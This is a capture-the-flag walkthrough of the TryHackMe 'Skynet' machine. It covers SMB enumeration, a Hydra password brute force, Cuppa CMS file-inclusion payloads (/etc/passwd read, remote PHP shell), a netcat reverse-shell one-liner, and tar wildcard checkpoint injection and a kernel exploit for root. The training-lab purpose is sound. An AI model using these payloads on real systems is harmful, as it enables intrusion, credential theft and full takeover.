# TryHackMe-Skynet

>Abdullah Rizwan , Sunday 25th October,05:36 PM

## NMAP

```
Nmap scan report for 10.10.209.122                                                                                                                  
Host is up (0.18s latency).                                                                                                                         
Not shown: 994 closed ports                                               
PORT    STATE SERVICE     VERSION                                                                                                                   
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                              
| ssh-hostkey:                                                                                                                                      
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)                                                                                      
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)                                                                                     
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)                                                                                   
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))                                                                                            
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                        
|_http-title: Skynet                 
110/tcp open  pop3        Dovecot pop3d                                   
|_pop3-capabilities: SASL TOP RESP-CODES CAPA AUTH-RESP-CODE PIPELINING UIDL                                                                        
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                               
143/tcp open  imap        Dovecot imapd                                   
|_imap-capabilities: capabilities SASL-IR Pre-login IDLE IMAP4rev1 have OK ID LOGIN-REFERRALS listed LOGINDISABLEDA0001 more ENABLE LITERAL+ post-lo
gin                                                                       
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)                                                                           
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                               
                                                                          
Host script results:                                                      
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s                                                                                       
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                           
| smb-os-discovery:                  
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)                                 
|   Computer name: skynet                                                 
|   NetBIOS computer name: SKYNET\x00                                     
|   Domain name: \x00                
|   FQDN: skynet                     
|_  System time: 2020-10-25T07:36:04-05:00                                                                                                          
| smb-security-mode:                                                                                                                                
|   account_used: guest
|   authentication_level: user                                            
|   challenge_response: supported                                         
|_  message_signing: disabled (dangerous, but default)                                                                                              
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2020-10-25T12:36:04                                             
|_  start_date: N/A                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 23.50 seconds                         
```

From the nmap result we can see the following ports are open

* PORT 22
* PORT 80
* PORT 110
* PORT 445

which we can enumerate


#### PORT 445

```
root@kali:~/TryHackMe/Easy/Skynet# smbmap -u anonymous -H 10.10.209.122
[+] Guest session       IP: 10.10.209.122:445   Name: 10.10.209.122                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

```
Here we can see only `anonymous` share is readable 

```
smbclient \\\\10.10.209.122\\anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep 18 09:41:20 2019
  ..                                  D        0  Tue Sep 17 12:20:17 2019
  attention.txt                       N      163  Wed Sep 18 08:04:59 2019
  logs                                D        0  Wed Sep 18 09:42:16 2019
  books                               D        0  Wed Sep 18 09:40:06 2019

                9204224 blocks of size 1024. 5372244 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

`A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
`

Head over to `\logs` in smbshare here you will find 3 text files
```
smb: \> cd logs
smb: \logs\> dir
  .                                   D        0  Wed Sep 18 09:42:16 2019
  ..                                  D        0  Wed Sep 18 09:41:20 2019
  log2.txt                            N        0  Wed Sep 18 09:42:13 2019
  log1.txt                            N      471  Wed Sep 18 09:41:59 2019
  log3.txt                            N        0  Wed Sep 18 09:42:16 2019

                9204224 blocks of size 1024. 5373956 blocks available

```
This pretty much doesn't give anything

<img src="https://imgur.com/BhCvZTb.png"/>

Only `log1.txt` has some potential passwords




#### PORT 80

<img src="https://imgur.com/MY4U2SZ.png"/>




#### Gobuster

```
gobuster dir -u http://10.10.209.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.209.122
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/25 18:03:31 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
Progress: 21226 / 220561 (9.62%)
```


<img src="https://imgur.com/5NRiqKF.png"/>

hydra -l miles -P log1.txt http-post-from 10.10.209.122 "/squirrelmail/src/redirect.php:login_username=^USER^ & secretkey=^PASS^&Login=Unknown user or password incorrect." 


#### Hydra


```
root@kali:~/TryHackMe/Easy/Skynet# hydra -l milesdyson -P log1.txt 10.10.209.122 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^ & secretkey=^PASS^&Login=Login:Unknown user or password incorrect." -V

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 18:24:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.209.122:80/squirrelmail/src/redirect.php:login_username=^USER^ & secretkey=^PASS^&Login=Login:Unknown user or password incorrect.
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.10.209.122 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.10.209.122   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 18:24:24


```

username :`milesdyson`   password: `cyborg007haloterminator`


<img src="https://imgur.com/Ncul0Xr.png"/>




```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Now we go back to smb shares

```
 smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -H 10.10.209.122
[+] IP: 10.10.209.122:445       Name: 10.10.209.122                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              READ ONLY       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

```

`smbclient \\\\10.10.209.122\\milesdyson -U milesdyson` enter password ``` )s{A&2Z=F^n_E.B` ```



```
smb: \> dir
  .                                   D        0  Tue Sep 17 14:05:47 2019
  ..                                  D        0  Wed Sep 18 08:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:05:14 2019
  notes                               D        0  Tue Sep 17 14:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:05:14 2019

                9204224 blocks of size 1024. 5367008 blocks available


```

We see `notes` directory

```
smb: \> cd notes                                                                                                                             [9/775]
smb: \notes\> dir                                                                                                                                   
  .                                   D        0  Tue Sep 17 14:18:40 2019 
  ..                                  D        0  Tue Sep 17 14:05:47 2019 
  3.01 Search.md                      N    65601  Tue Sep 17 14:01:29 2019 
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:01:29 2019 
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:01:29 2019 
  0.00 Cover.md                       N     3114  Tue Sep 17 14:01:29 2019 
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:01:29 2019 
  important.txt                       N      117  Tue Sep 17 14:18:39 2019 
  6.01 pandas.md                      N     9221  Tue Sep 17 14:01:29 2019 
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:01:29 2019 
  3.02 Planning.md                    N    71657  Tue Sep 17 14:01:29 2019 
  1.04 Probability.md                 N    62712  Tue Sep 17 14:01:29 2019 
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:01:29 2019 
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:01:29 2019 
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:01:29 2019 
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:01:29 2019 
  6.00 Appendices.md                  N       20  Tue Sep 17 14:01:29 2019 
  1.01 Functions.md                   N     7627  Tue Sep 17 14:01:29 2019 
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:01:29 2019 
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:01:29 2019 
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:01:29 2019 
  4.00 Simulation.md                  N       20  Tue Sep 17 14:01:29 2019 
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:01:29 2019 
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:01:29 2019 
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:01:29 2019 
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:01:29 2019 
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:01:29 2019 
  5.01 Process.md                     N     5788  Tue Sep 17 14:01:29 2019 
  1.09 Optimization.md                N    25823  Tue Sep 17 14:01:29 2019 
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:01:29 2019 

```

Reading the contents of `important.txt`
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

Again running gobuster on the hidden directory
```
gobuster dir -u http://10.10.209.122/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.209.122/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/25 19:08:35 Starting gobuster
===============================================================
/administrator (Status: 301)
Progress: 6554 / 220561 (2.97%)


```

<img src="https://imgur.com/JlUajdI.png"/>



```
searchsploit cuppa
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                   | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

We can see that 

```
An attacker can exploit this issue with a browser.

The following example URIs are available:

http://www.example.com/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://www.example.com/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

```

So using the concept of RFI (Remote File Inclusion) we can include a any remote file since LFI (Local File Inclusion) vulnerability exists. 

#### LFI
`http://10.10.209.122/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

#### RFI

Grab a reverse shell from pentest monkey `https://github.com/pentestmonkey/php-reverse-shell`

Change the ip and port and  then start a http server along with a listener 

`nc -lvp [port]`

`python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... `

`10.10.209.122/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.3.143:8000/php-reverse-shell.php`

This will be your RFI


#### Reverse Shell

<img src="https://imgur.com/wEh4NC6.png"/>


#### Privilege Escalation


###### Method 1

<img src="https://imgur.com/jB592jJ.png"/>

Here we can see `tar cf /home/milesdyson/backups/backup.tgz *` so this wildcard makes this command to be vulnerable

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

Execute these commands on the target machine 

mkfifo /tmp/lhennp; nc 10.14.3.143 5555 0</tmp/lhennp | /bin/bash >/tmp/lhennp 2>&1; rm /tmp/lhennp
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *


Then set up netcat listener

nc -lvp 5555

```
id
uid=0(root) gid=0(root) groups=0(root)
ls -la
total 80
drwxr-xr-x 8 www-data www-data  4096 Oct 26 08:26 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
-rw-rw-rw- 1 www-data www-data     0 Oct 26 08:02 archive.tar
-rw-rw-rw- 1 www-data www-data     1 Oct 26 08:02 --checkpoint=1
-rw-rw-rw- 1 www-data www-data     1 Oct 26 08:02 --checkpoint-action=exec=sh shell.sh
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   100 Oct 26 08:26 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
cd /root
ls -la
total 28
drwx------  4 root root 4096 Sep 17  2019 .
drwxr-xr-x 23 root root 4096 Sep 18  2019 ..
lrwxrwxrwx  1 root root    9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep 17  2019 .cache
drwxr-xr-x  2 root root 4096 Sep 17  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 17  2019 root.txt


```
###### Method 2
You can go the other way around in rooting the box by checking the kernel version

```
www-data@skynet:/home/milesdyson$ uname -vr
4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
www-data@skynet:/home/milesdyson$ uname
Linux
www-data@skynet:/home/milesdyson$ uname -vvv
#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
www-data@skynet:/home/milesdyson$ 

```

Here the kernel version is `4.8.0`  nad ubuntu version is `16.04.1` 


```
root@kali:~/TryHackMe/Medium/Skynet# searchsploit 4.8.0
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Alienvault Open Source SIEM (OSSIM) < 4.8.0 - 'get_file' Information Disclosure (Metasploit)                      | linux/remote/42695.rb
eToolz 3.4.8.0 - Denial of Service (PoC)                                                                          | windows_x86-64/dos/45797.py
Haihaisoft Universal Player 1.4.8.0 - 'URL' Property ActiveX Buffer Overflow                                      | windows/remote/10269.html
iCAM Workstation Control 4.8.0.0 - Authentication Bypass                                                          | windows/local/32158.txt
Linux 4.8.0 < 4.8.0-46 - AF_PACKET packet_set_ring Privilege Escalation (Metasploit)                              | linux/local/44654.rb
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                        | linux/local/41886.c
Linux Kernel 4.8.0-22/3.10.0-327 (Ubuntu 16.10 / RedHat) - 'keyctl' Null Pointer Dereference                      | linux/dos/40762.c
Linux Kernel 4.8.0-34 < 4.8.0-45 (Ubuntu / Linux Mint) - Packet Socket Local Privilege Escalation                 | linux/local/47168.c
Linux Kernel 4.8.0-41-generic (Ubuntu) - Packet Socket Local Privilege Escalation                                 | linux/local/41994.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)             | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR | linux/local/47169.c
phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                                                           | php/webapps/44496.html
Port Forwarding Wizard 4.8.0 - Buffer Overflow (SEH)                                                              | windows/local/48695.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

Here `Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation` stands perfect exploit 

copy to your directory or download it from `exploit-db` then host it on your local machine 

<img src="https://imgur.com/c1Ab3ge.png"/>

Compile the program 

<img src="https://imgur.com/orxmNU0.png"/>

<img src="https://imgur.com/WndsGFD.png"/>

And you got root !!!